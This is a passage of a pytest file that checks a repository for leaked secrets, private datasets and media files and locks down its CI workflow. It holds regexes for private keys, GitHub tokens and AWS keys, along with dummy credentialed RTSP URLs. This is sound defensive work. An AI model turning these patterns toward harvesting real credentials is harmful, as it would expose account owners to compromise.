from __future__ import annotations

import copy
import csv
import functools
import json
import re
import subprocess
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]

_PROHIBITED_SUFFIXES = {
    ".7z",
    ".arrow",
    ".avi",
    ".bmp",
    ".ckpt",
    ".csv",
    ".db",
    ".feather",
    ".dcm",
    ".dicom",
    ".gif",
    ".flac",
    ".gz",
    ".h5",
    ".jpeg",
    ".jpg",
    ".jsonl",
    ".ico",
    ".m4a",
    ".mkv",
    ".mov",
    ".mp3",
    ".mp4",
    ".ndjson",
    ".lz4",
    ".onnx",
    ".parquet",
    ".pdf",
    ".png",
    ".pte",
    ".pt",
    ".pth",
    ".rar",
    ".sqlite",
    ".safetensors",
    ".tar",
    ".wasm",
    ".tflite",
    ".tif",
    ".tiff",
    ".tsv",
    ".wav",
    ".webm",
    ".webp",
    ".zip",
}
_PROHIBITED_PATH_PARTS = {
    "annotations",
    "checkpoints",
    "data",
    "dataset",
    "datasets",
    "eval",
    "evaluation",
    "exports",
    "labels",
    "linkage",
    "models",
    "weights",
}
_MEDIA_OR_ARCHIVE_MAGIC = (
    b"\x00\x00\x01\x00",
    b"\x00asm",
    b"\x04\x22\x4d\x18",
    b"!<arch>\n",
    b"%PDF",
    b"SQLite format 3\x00",
    b"fLaC",
    b"\x1aE\xdf\xa3",
    b"\x1f\x8b",
    b"\x28\xb5\x2f\xfd",
    b"\x7fELF",
    b"\xfd7zXZ\x00",
    b"7z\xbc\xaf\x27\x1c",
    b"BM",
    b"BZh",
    b"GIF8",
    b"ID3",
    b"II*\x00",
    b"MM\x00*",
    b"OggS",
    b"PK\x03\x04",
    b"Rar!\x1a\x07",
    b"\x89PNG\r\n\x1a\n",
    b"\xff\xd8\xff",
    b"version https://git-lfs.github.com/spec/v1",
)
_SYNTHETIC_RTSP_FIXTURES = {
    # 엣지 브링업 스킬의 두 URL 은 값이 아니라 변수 보간이다. 자격증명이 문자열
    # 안에 들어 있는 게 아니라 실행 시점에 환경변수에서 온다. 허용 목록이 정확한
    # 문자열로 매칭되니, 누군가 나중에 여기에 실제 비밀번호를 박아 넣으면 문자열이
    # 달라져 가드가 그대로 잡는다 — 예외가 파일 전체로 번지지 않는다.
    Path(".claude/skills/edge-bringup/references/worker-roster.md"): {
        "rtsp://{CAM_USER}:{CAM_PASSWORD}@{camera_ip}:554/trackID=2",
        # <사용자>/<비밀번호>/<카메라 IP> 도 값이 아니라 사람이 채워 넣을 자리
        # 표시자다. 호스트 자리표시자에 공백이 있어(`<카메라 IP>`) 정규식이
        # 호스트를 `<카메라` 에서 끊어 매칭한다.
        "rtsp://<사용자>:<비밀번호>@<카메라",
    },
    Path(".claude/skills/edge-bringup/scripts/rtsp_sweep.sh"): {
        "rtsp://${CAM_USER}:${CAM_PASSWORD}@${ip}:554/${TRACK}",
    },
    Path("tests/test_alert_amplification_harness.py"): {
        # 스캐너가 자격증명 포함 RTSP URL 을 거부하는지 증명하는 입력값이다.
        # 실제 카메라가 아니라 거부되어야 하는 형태를 보여주는 합성 리터럴.
        "rtsp://user:pass@camera/live",
    },
    Path("front/src/features/camera-management/CameraManagementPage.test.tsx"): {
        "rtsp://user:***@redacted-camera/live",
    },
    Path("front/src/features/cameras/AddCameraModal.test.tsx"): {
        "rtsp://operator:***@192.0.2.10:8554/live",
        "rtsp://operator:secret@192.0.2.10:8554/trackID=1?profile=main",
        "rtsp" "://operator:camera-password@camera.local:554/"
        "trackID=1?profile=main&opaque-secret-token&another%2Dsecret"
        "#token=fragment-secret",
        "rtsp" "://operator:camera-password@[invalid-host:554/"
        "trackID=1?profile=main&token=query-secret&token=second-secret",
        "rtsp://***@[invalid-host:554/"
        "trackID=1?profile=***&token=***&token=***",
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
    },
    Path("front/src/features/cameras/cameraRegistrationForm.test.ts"): {
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
        "rtsp://operator%20name:p%40ss%2Fword@camera.local:554/trackID=1",
    },
    Path("front/src/features/cameras/CameraCard.test.tsx"): {
        "rtsp://user:****@camera.local/stream",
    },
    # 세 IDIS 서브스트림 안내 테스트의 fixture. 192.0.2.10 은 실제 카메라가
    # 아니라 문서용 TEST-NET-1 주소(RFC 5737)이고 admin:pw 는 고정 더미
    # 자격증명이다.
    Path("front/src/features/settings/CameraEditModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
    },
    Path("front/src/features/settings/CameraRegisterModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
    },
    Path("front/src/features/settings/rtspSubstreamGuidance.test.ts"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/TrackId=1",
        "rtsp://admin:pw@192.0.2.10:554/stream",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
        "rtsp://admin:pw@192.0.2.10:554/trackID=3",
    },
    Path("front/src/shared/api/normalizers.test.ts"): {
        "rtsp://operator:hunter2@camera.internal.example:554/stream",
    },
    Path("tests/test_api_camera_registry.py"): {
        "rtsp://user:secret@camera.local:8554/live",
        "rtsp://***:***@redacted-camera:8554/live",
        "rtsp://user:secret@local/stream",
        "rtsp://***:***@redacted-camera/stream",
        "rtsp://admin:admin@cam.local/stream",
        "rtsp://admin:newpass@cam.local/stream",
    },
    Path("tests/test_camera_api.py"): {
        # camera.example 는 문서용(RFC 2606) 예약 도메인이고 operator:private 는
        # 고정 더미 자격증명이다 -- 실제 카메라나 비밀이 아니다. 이 테스트는 이
        # 자격증명이 토폴로지 응답에서 절대 새지 않음을 증명한다.
        "rtsp://operator:private@camera.example/live",
    },
    Path("tests/test_camera_roster_sync.py"): {
        "rtsp://user:password@camera/private",
    },
    Path("tests/test_camera_topology_store.py"): {
        "rtsp://operator:private@10.0.0.9/live",
    },
    Path("tests/test_sources_rtsp.py"): {
        "rtsp://user:password@camera.local/live",
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream",
        "rtsp://***:***@host/stream",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream"
        "?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_catalog_verify.py"): {
        "rtsp://operator:fixture-password@192.0.2.10/s",
        "rtsp://operator:fixture-password@192.0.2.11/s",
    },
    Path("tests/test_clips_catalog.py"): {
        "rtsp://operator:fixture-password@example.test/live",
    },
    Path("tests/test_worker_config_lifecycle.py"): {
        "rtsp://user:camera-pass@camera/live",
        "rtsp://user:leaked-camera-password@camera/live",
    },
    Path("tests/test_worker_config_local_overrides.py"): {
        "rtsp://user:camera-pass@camera/live",
    },
    Path("tests/test_worker_ingest_lifecycle.py"): {
        "rtsp://operator:s3cr3t@example.test/live?token=plain",
    },
    Path("tests/test_worker_ingest_rtsp.py"): {
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream"
        "?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream"
        "?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_analysis_timeline.py"): {
        # URL 모양이라는 이유만으로 컴포넌트 식별자에서 거부됨을 증명하는 픽스처.
        # user:secret 는 고정 더미이고 자격증명 자체는 검증 대상이 아니다.
        "rtsp://user:secret@camera/model",
    },
    Path("tests/test_edge_topology_contract.py"): {
        # bed-exit e2e 스크립트가 BED_EXIT_RTSP_URL 을 dry-run 출력에서
        # `rtsp://<redacted>` 로 마스킹함을 증명한다. camera-1.local 은
        # 예약 .local 이고 camera-user:camera-secret 는 고정 더미다.
        "rtsp://camera-user:camera-secret@camera-1.local/trackID=2",
    },
    Path("tests/test_rtsp_url_policy.py"): {
        # camera.example/cam.example 는 문서용(RFC 2606) 예약 도메인이고
        # user:pass 는 고정 더미 자격증명이다. 이 테스트들은 userinfo 가 핀 고정
        # 과정에서 보존되고 정책이 URL 을 올바르게 허용/거부함을 증명한다.
        "rtsp://user:pass@camera.example:8554/path?subtype=0",
        "rtsp://user:pass@cam.example:8554/live?x=1",
        # cam.example 이 8.8.8.8 로 핀 고정된 뒤의 pinned_url -- userinfo 보존 확인.
        "rtsp://user:pass@8.8.8.8:8554/live?x=1",
    },
    Path("tests/test_runtime_manifest.py"): {
        # camera.local 은 예약 .local 이고 admin:secret 는 고정 더미다. 이
        # 테스트는 자격증명 URL 이 매니페스트 직렬화에 절대 포함되지 않음을 증명한다.
        "rtsp://admin:secret@camera.local/live",
    },
    Path("tests/test_worker_mjpeg_server.py"): {
        # 8.8.8.8 은 admission DNS 핀 고정이 성공하도록 쓰는 공개 IP 이고
        # user:secret 는 고정 더미다. 이 테스트들은 probe URL/자격증명이 응답에
        # 절대 새지 않음을 증명한다.
        "rtsp://user:secret@8.8.8.8/trackID=2",
    },
    Path("tests/test_decode_seam_nvdec_subprocess.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_nvdec_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_nvdec_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_vaapi_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_vaapi_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_public_repository_privacy.py"): {
        "rtsps" "://operator:not-a-fixture@camera.example/stream",
        "rtsps" "://operator:secret@camera.example/stream",
    },
}
_TEXT_PATTERNS = {
    "private-key": re.compile(
        r"-----BEGIN (?:EC |OPENSSH |PGP |RSA )?PRIVATE KEY-----"
    ),
    "credentialed-rtsp": re.compile(
        r"rtsps?://(?P<username>[^/\s:@]+):(?P<password>[^@\s/]+)"
        r"@(?P<host>[^/\s\"']+)(?:/[^\s\"']*)?",
        re.IGNORECASE,
    ),
    "rtsp-query-secret": re.compile(
        r"rtsps?://[^\s\"']*[?&](?:token|secret|password|username)="
        r"[^&#\s\"']+",
        re.IGNORECASE,
    ),
    "github-token": re.compile(
        r"(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})"
    ),
    "aws-access-key": re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"),
    "encoded-media-data-uri": re.compile(
        r"data:[^;,\r\n]{1,128};base64,",
        re.IGNORECASE,
    ),
    "hex-encoded-media-signature": re.compile(
        r"(?:8950" r"4e470d0a1a0a|2550" r"4446|ffd8" r"ff|504b" r"0304)",
        re.IGNORECASE,
    ),
}


def _validate_index_mode(mode: bytes, path: bytes) -> None:
    if mode not in {b"100644", b"100755"}:
        raise AssertionError(
            f"non-regular index entry: {path.decode(errors='replace')} ({mode.decode()})"
        )


@functools.cache
def _index_blobs() -> tuple[tuple[Path, bytes], ...]:
    result = subprocess.run(
        ["git", "ls-files", "--stage", "-z"],
        cwd=ROOT,
        check=True,
        capture_output=True,
    )
    blobs: list[tuple[Path, bytes]] = []
    for record in result.stdout.split(b"\0"):
        if not record:
            continue
        metadata, raw_path = record.split(b"\t", 1)
        mode, oid, stage = metadata.split()
        if stage != b"0":
            raise AssertionError(f"unmerged index entry: {raw_path.decode(errors='replace')}")
        _validate_index_mode(mode, raw_path)
        blob = subprocess.run(
            ["git", "cat-file", "blob", oid.decode("ascii")],
            cwd=ROOT,
            check=True,
            capture_output=True,
        ).stdout
        blobs.append((Path(raw_path.decode("utf-8")), blob))
    return tuple(blobs)


def _looks_like_media_or_archive(blob: bytes) -> bool:
    if blob.startswith(_MEDIA_OR_ARCHIVE_MAGIC):
        return True
    if len(blob) >= 12 and blob[4:8] == b"ftyp":
        return True
    if len(blob) >= 12 and blob[8:12] in {b"AVI ", b"WAVE", b"WEBP"}:
        return True
    if len(blob) >= 132 and blob[128:132] == b"DICM":
        return True
    return len(blob) >= 262 and blob[257:262] == b"ustar"


def _collect_mapping_keys(value: object) -> set[str]:
    keys: set[str] = set()
    if isinstance(value, dict):
        for key, child in value.items():
            keys.add(str(key).strip().lower())
            keys.update(_collect_mapping_keys(child))
    elif isinstance(value, list):
        for child in value:
            keys.update(_collect_mapping_keys(child))
    return keys


def _structured_document_keys(text: str) -> set[str]:
    significant_lines = [
        line.strip()
        for line in text.splitlines()
        if line.strip()
        and not line.lstrip().startswith("#")
        and line.strip() != "---"
        and not line.strip().startswith("%YAML")
    ]
    if not significant_lines:
        return set()
    first = significant_lines[0]
    structured_header = re.compile(
        r"""^["']?[A-Za-z_][A-Za-z0-9_]*["']?\s*:"""
    )
    collection_start = first.startswith(("{", "[", "-"))
    if first.startswith(("{", "[")):
        try:
            return _collect_mapping_keys(json.loads(text))
        except json.JSONDecodeError:
            pass
    if not collection_start and not structured_header.match(first):
        return set()
    try:
        return _collect_mapping_keys(yaml.load(text, Loader=yaml.BaseLoader))
    except yaml.YAMLError:
        return set()


def _looks_like_sensitive_dataset(blob: bytes) -> bool:
    try:
        text = blob.decode("utf-8-sig")
    except UnicodeDecodeError:
        return False
    first_line = next((line for line in text.splitlines() if line.strip()), "")
    if not first_line:
        return False

    identity_fields = {"camera_id", "facility_id", "resident_id", "subject_id"}
    evidence_fields = {"annotation", "fall", "file_path", "frame_path", "label"}

    structured_fields = _structured_document_keys(text)
    if len(structured_fields & identity_fields) >= 2:
        return True
    if structured_fields & identity_fields and structured_fields & evidence_fields:
        return True

    for delimiter in (",", ";", "\t"):
        fields = {
            field.strip().lower()
            for field in next(csv.reader([first_line], delimiter=delimiter))
        }
        if len(fields & identity_fields) >= 2:
            return True
        if fields & identity_fields and fields & evidence_fields:
            return True
    return False


def _is_explicit_synthetic_rtsp(relative: Path, match: re.Match[str]) -> bool:
    value = match.group(0)
    if value in _SYNTHETIC_RTSP_FIXTURES.get(relative, set()):
        return True
    policy_path = Path("tests/test_public_repository_privacy.py")
    return relative == policy_path and any(
        value in fixtures for fixtures in _SYNTHETIC_RTSP_FIXTURES.values()
    )


def _has_url_safe_or_wrapped_base64(text: str) -> bool:
    contiguous = r"(?<![A-Za-z0-9+/_-])[A-Za-z0-9+/_-]{512,}"
    if re.search(contiguous, text):
        return True

    for block in re.split(r"\n[ \t]*\n", text):
        payload_lines = [
            re.sub(r"^\s*(?:#|//)\s?", "", line)
            for line in block.splitlines()
        ]
        candidate = re.sub(r"\s+", "", "".join(payload_lines))
        if len(candidate.rstrip("=")) >= 512 and re.fullmatch(
            r"[A-Za-z0-9+/_-]+={0,2}", candidate
        ):
            return True
    return False


def _text_violation_labels(relative: Path, text: str) -> set[str]:
    violations: set[str] = set()
    for label, pattern in _TEXT_PATTERNS.items():
        scan_text = text
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            scan_text = re.sub(r"""(["'])\s*(?:\+\s*)?["']""", "", text)
        matches = list(pattern.finditer(scan_text))
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            matches = [
                match
                for match in matches
                if not _is_explicit_synthetic_rtsp(relative, match)
            ]
        if matches:
            violations.add(label)
    if _has_url_safe_or_wrapped_base64(text):
        violations.add("url-safe-or-wrapped-base64")
    return violations


def _contains_forbidden_control_bytes(blob: bytes) -> bool:
    return any(byte < 9 or 13 < byte < 32 for byte in blob)


PUBLIC_SAFE_STRUCTURED_FIXTURES = frozenset(
    {
        Path("worker/ml-worker.example.yaml"),
        # Issue #133: small text sidecars (architecture shape + manifest)
        # derived from the packaged default LSTM fall-detector's actual
        # weights -- not data, not credentials, not PII. The weights
        # themselves (model.pt) stay gitignored; only these two sidecars are
        # tracked, carved out of the blanket `models/` ignore.
        Path("models/fall/lstm/arch.json"),
        Path("models/fall/lstm/metadata.yaml"),
    }
)


PUBLIC_SAFE_CONTRACT_FIXTURES = frozenset(
    {
        # edge-provisioning-v1's request/response contract fixtures. This
        # JSON document trips the identity+evidence-field heuristic below
        # (it has both "camera_id" and "label" keys, coincidentally --
        # topology-snapshot request bodies use both) even though it is a
        # synthetic API-contract corpus, not recorded footage metadata. The
        # file's own metadata.redaction field is checked below so a future
        # edit that starts embedding real values changes that string and the
        # guard catches it again -- the exemption doesn't silently widen.
        Path("contracts/edge-provisioning-v1/contract-fixtures.json"),
    }
)
_CONTRACT_FIXTURE_REDACTION_NOTICE = "Synthetic identifiers and redacted one-time values only"


def _is_public_safe_contract_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_CONTRACT_FIXTURES:
        return False
    try:
        document = json.loads(blob.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return False
    if not isinstance(document, dict):
        return False
    metadata = document.get("metadata")
    if not isinstance(metadata, dict):
        return False
    return metadata.get("redaction") == _CONTRACT_FIXTURE_REDACTION_NOTICE


def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    document = yaml.load(blob, Loader=yaml.BaseLoader)
    if not isinstance(document, dict):
        return False
    identity_keys = {"camera_id", "facility_id", "resident_id", "subject_id"}
    outside_cameras = {
        key: value for key, value in document.items() if key != "cameras"
    }
    if _collect_mapping_keys(outside_cameras) & identity_keys:
        return False
    cameras = document.get("cameras")
    if not isinstance(cameras, list) or not cameras:
        return False
    allowed_camera_keys = {
        "camera_id",
        "facility_id",
        "resident_id",
        "rtsp_url",
        "heartbeat_interval_sec",
        "frame_stride",
        "label",
    }
    for camera in cameras:
        if not isinstance(camera, dict) or set(camera) != allowed_camera_keys:
            return False
        if not re.fullmatch(r"camera-\d+", str(camera.get("camera_id", ""))):
            return False
        if not re.fullmatch(r"facility-\d+", str(camera.get("facility_id", ""))):
            return False
        if not re.fullmatch(r"resident-\d+", str(camera.get("resident_id", ""))):
            return False
        rtsp_url = str(camera.get("rtsp_url", ""))
        if not re.fullmatch(r"rtsp://camera-\d+\.local/trackID=\d+", rtsp_url):
            return False
        if not re.fullmatch(r"Room \d+", str(camera.get("label", ""))):
            return False
    return True


def _is_prohibited_path(relative: Path) -> bool:
    # Exact-path exemption only -- explicitly named-safe fixtures (see
    # PUBLIC_SAFE_STRUCTURED_FIXTURES's docstring above) bypass the path-part
    # guardrail below without weakening it for anything else under a
    # prohibited directory like `models/`.
    if relative in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    lowered_parts = {part.lower() for part in relative.parts}
    lowered_suffixes = {suffix.lower() for suffix in relative.suffixes}
    return bool(
        lowered_parts & _PROHIBITED_PATH_PARTS
        or lowered_suffixes & _PROHIBITED_SUFFIXES
    )


def test_tracked_tree_contains_no_data_or_private_binary_assets() -> None:
    violations: list[str] = []
    for relative, blob in _index_blobs():
        if _is_prohibited_path(relative):
            violations.append(str(relative))
            continue
        is_private_structured_data = (
            _looks_like_sensitive_dataset(blob)
            and not _is_public_safe_structured_fixture(relative, blob)
            and not _is_public_safe_contract_fixture(relative, blob)
        )
        if _contains_forbidden_control_bytes(blob):
            violations.append(f"{relative}:control-bytes")
            continue
        if _looks_like_media_or_archive(blob) or is_private_structured_data:
            violations.append(str(relative))
            continue
        try:
            blob.decode("utf-8")
        except UnicodeDecodeError:
            violations.append(f"{relative}:unknown-binary")

    assert violations == []


def test_tracked_text_contains_no_embedded_secret_or_media_payload() -> None:
    violations: list[str] = []

    for relative, blob in _index_blobs():
        try:
            text = blob.decode("utf-8")
        except UnicodeDecodeError:
            continue
        violations.extend(
            f"{relative}:{label}"
            for label in sorted(_text_violation_labels(relative, text))
        )

    assert violations == []


@pytest.mark.parametrize(
    ("text", "expected_label"),
    [
        ("A" * 512, "url-safe-or-wrapped-base64"),
        ("data" + ":image/png;base64," + "A" * 64, "encoded-media-data-uri"),
        ("_" * 512, "url-safe-or-wrapped-base64"),
        ("\n".join(["A" * 64] * 8), "url-safe-or-wrapped-base64"),
        (
            "data" + ":application/pdf;base64," + "A" * 64,
            "encoded-media-data-uri",
        ),
        (" ".join(["A" * 16] * 32), "url-safe-or-wrapped-base64"),
        (
            "\n".join(["A" * 64, "# split"] * 8),
            "url-safe-or-wrapped-base64",
        ),
        (
            "\n".join(["# " + "A" * 64] * 8),
            "url-safe-or-wrapped-base64",
        ),
        ("8950" "4e470d0a1a0a" + "00" * 32, "hex-encoded-media-signature"),
        (
            "rtsps" "://operator:not-a-fixture@camera.example/stream",
            "credentialed-rtsp",
        ),
    ],
)
def test_text_scanner_rejects_encoded_payloads(
    text: str, expected_label: str
) -> None:
    labels = _text_violation_labels(Path("synthetic-input.txt"), text)
    assert expected_label in labels


def test_text_scanner_allows_short_encoded_looking_text() -> None:
    assert _text_violation_labels(Path("synthetic-input.txt"), "A" * 63) == set()


@pytest.mark.parametrize(
    "path",
    [
        Path("Data/export.txt"),
        Path("models/weights.txt"),
        Path("public/disguised.CSV.txt"),
        Path("public/clip.MP4.backup"),
    ],
)
def test_path_policy_rejects_case_and_double_extension_evasions(path: Path) -> None:
    assert _is_prohibited_path(path)


@pytest.mark.parametrize(
    "blob",
    [
        "facility_id,resident_id\nfacility,resident".encode("utf-16le"),
        "facility_id,resident_id\nfacility,resident".encode("utf-16be"),
        ("rtsps" "://operator:secret@camera.example/stream").encode("utf-32le"),
        b"safe-prefix\x00hidden",
    ],
)
def test_control_byte_gate_rejects_alternate_encodings(blob: bytes) -> None:
    assert _contains_forbidden_control_bytes(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"\x89PNG\r\n\x1a\npayload",
        b"PK\x03\x04archive",
        b"facility_id,resident_id,label\nfacility,resident,fall",
        b"camera_id\tframe_path\tannotation\ncamera\tframe.jpg\tfall",
    ],
)
def test_content_classifier_rejects_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)

@pytest.mark.parametrize(
    "blob",
    [
        b"BZh91AY&SY",
        b"\xfd7zXZ\x00payload",
        b"\x28\xb5\x2f\xfdpayload",
        b"\x1aE\xdf\xa3payload",
        b"ID3payload",
        b"%PDF-1.7",
        b"SQLite format 3\x00payload",
        b"fLaCpayload",
        b"\x00asmpayload",
        b"\x04\x22\x4d\x18payload",
        b"\x00\x00\x01\x00payload",
        b"!<arch>\npayload",
        b"\x00" * 128 + b"DICMpayload",
        b"facility_id,resident_id\nfacility,resident",
        b'{"facility_id":"facility","subject_id":"subject"}',
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:0000000000000000000000000000000000000000000000000000000000000000\n"
        b"size 1024\n",
        b"facility_id: facility\nresident_id: resident\n",
        b'{\n  "records": [\n'
        b'    {"facility_id": "facility", "resident_id": "resident"}\n'
        b"  ]\n}\n",
        b"# synthetic adversarial document\n---\nrecords:\n"
        b"  - facility_id: facility\n"
        b"    resident_id: resident\n",
        b"- facility_id: facility\n  resident_id: resident\n",
        b"{facility_id: facility, resident_id: resident}\n",
        b'\xef\xbb\xbf"facility_id","frame_path","annotation"\n'
        b'"facility","frame.jpg","fall"',
    ],
)
def test_classifier_rejects_additional_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"def camera_id() -> str:\n    return 'camera-a'\n",
        b"public equations and source schemas remain allowed\n",
    ],
)
def test_classifier_allows_public_safe_source_text(blob: bytes) -> None:
    assert not _looks_like_media_or_archive(blob)
    assert not _looks_like_sensitive_dataset(blob)


def test_public_worker_example_allowlist_is_closed_world() -> None:
    relative = Path("worker/ml-worker.example.yaml")
    blob = next(blob for path, blob in _index_blobs() if path == relative)
    assert _is_public_safe_structured_fixture(relative, blob)

    camera_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    camera_mutation["cameras"][0]["subject_id"] = "subject"
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(camera_mutation).encode()
    )

    nested_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    nested_mutation["private_records"] = [
        {"facility_id": "facility", "resident_id": "resident"}
    ]
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(nested_mutation).encode()
    )


def test_ignore_policy_has_no_data_exception() -> None:
    ignore_blob = next(
        blob for relative, blob in _index_blobs() if relative == Path(".gitignore")
    )
    lines = ignore_blob.decode("utf-8").splitlines()
    assert "data/" in lines
    assert not any(line.startswith("!data/") for line in lines)


def _workflow(name: str) -> dict[str, object]:
    path = ROOT / ".github" / "workflows" / name
    for relative, blob in _index_blobs():
        if relative == path.relative_to(ROOT):
            loaded = yaml.load(blob, Loader=yaml.BaseLoader)
            assert isinstance(loaded, dict)
            return loaded
    raise AssertionError(f"workflow is not tracked: {name}")


def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
    assert set(workflow) == {"jobs", "name", "on", "permissions"}
    assert workflow["on"] == {"pull_request": "", "push": ""}
    assert workflow["permissions"] == {"contents": "read"}

    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert set(jobs) == {"test"}
    job = jobs["test"]
    assert isinstance(job, dict)
    assert set(job) == {"runs-on", "steps"}
    assert job["runs-on"] == "ubuntu-latest"
    steps = job["steps"]
    assert isinstance(steps, list)
    assert steps == [
        {
            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
            "with": {"persist-credentials": "false"},
        },
        {
            "name": "Scan tracked tree for secrets",
            "run": (
                'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
                "zricethezav/gitleaks@sha256:"
                "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
                "detect --source=/repo --no-git --redact --exit-code=1"
            ),
        },
        {
            "uses": "astral-sh/setup-uv@"
            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
            "with": {"enable-cache": "false", "version": "0.11.27"},
        },
        # fonts-noto-cjk provisions the same real CJK glyph file the runtime
        # image installs (Dockerfile.edge). It is a plain distro apt package:
        # it fetches no other repository, reads no secret, starts no container,
        # and re-checks out nothing, so it stays admissible under this
        # closed-world contract. Declared here because a step added to public
        # CI must be listed, not inferred.
        {
            "name": "Install FFmpeg and packaged CJK overlay font",
            "run": (
                "sudo apt-get update && "
                "sudo apt-get install -y --no-install-recommends "
                "ffmpeg fonts-noto-cjk"
            ),
        },
        {"run": "uv sync --frozen --group lint"},
        {
            "name": "Fetch packaged default LSTM model",
            "run": "bash scripts/fetch-models.sh",
        },
        # Real-stack E2E (mediamtx-backed) is deselected here by marker, not by
        # adding a step -- the security contract below (step count/order, no
        # external-binary fetch) is unchanged; only this step's own argument
        # changed. See tests/AGENTS.md for running the real-stack E2E locally.
        # 무거운 워치독 테스트는 CI에서 뺀다(`heavy`). 실제 서브프로세스가
        # 벽시계 deadline으로 죽기를 기다리므로 부하 걸린 러너에서 기동만으로
        # 넘긴다. 이 문자열이 바뀌면 CI가 무엇을 돌리는지 바뀐 것이므로
        # 여기서 잡는 것이 맞다 — 자동으로 따라가게 하지 않는다.
        # `integration` also deselects here, which is what pyproject.toml's
        # marker description already promised ("excluded from the default CI
        # suite") while this argument did not deliver it. Its one test drives a
        # live enrolled ml-api via CLOUD_EDGE_ML_URL, so on a runner it can only
        # fail on the missing env -- and it did, on main.
        {
            "run": (
                "uv run pytest -q -m "
                '"not real_stack and not heavy and not integration"'
            )
        },
        {"run": "uv run --group lint ruff check ."},
        {"run": "uv run --group lint lint-imports"},
        # Scope fidelity runs a tracked in-repo Python script over this same
        # checkout: it greps for env-provisioned facility identity and camera
        # roster residue. It fetches nothing, reads no secret, starts no
        # container, and re-checks out no other repository, so it is admissible
        # under this closed-world contract. Listing it here is the point of the
        # contract -- a step added to public CI must be declared, not inferred.
        {
            "name": (
                "Scope fidelity "
                "(no env-provisioned identity or camera roster)"
            ),
            "run": (
                "uv run python scripts/verify_scope_fidelity.py --fixture\n"
                "uv run python scripts/verify_scope_fidelity.py --repo\n"
            ),
        },
        # #179/#182: the shipped example must render on its own -- this only
        # renders and validates compose config from the tracked, placeholder-
        # only .env.edge.prod.example (never the gitignored real
        # .env.edge.prod), pulls no images, starts no containers, uses no
        # secrets/tokens, and re-checks out no other repository.
        {
            "name": "Edge env example renders (GPU + CPU-only overlay)",
            "run": (
                "docker compose --env-file .env.edge.prod.example \\\n"
                "  -f compose.edge.yaml -f compose.edge.cpu.yaml config -q\n"
            ),
        },
    ]

    serialized = yaml.safe_dump(workflow)
    assert "eldercare-dataset-ops" not in serialized
    assert "DATASET_OPS_TOKEN" not in serialized
    assert ".dataset-ops" not in serialized
    assert "upload-artifact" not in serialized
    assert "actions/cache" not in serialized


@pytest.mark.parametrize("mode", [b"120000", b"160000"])
def test_index_policy_rejects_linkage_modes(mode: bytes) -> None:
    with pytest.raises(AssertionError):
        _validate_index_mode(mode, b"synthetic-link")


def test_untrusted_ci_has_no_private_repository_access() -> None:
    _assert_untrusted_ci_security(_workflow("ci.yml"))


@pytest.mark.parametrize(
    ("step_index", "field", "value"),
    [
        (0, "uses", "actions/checkout@v4"),
        (1, "run", "echo gitleaks@sha256:placeholder"),
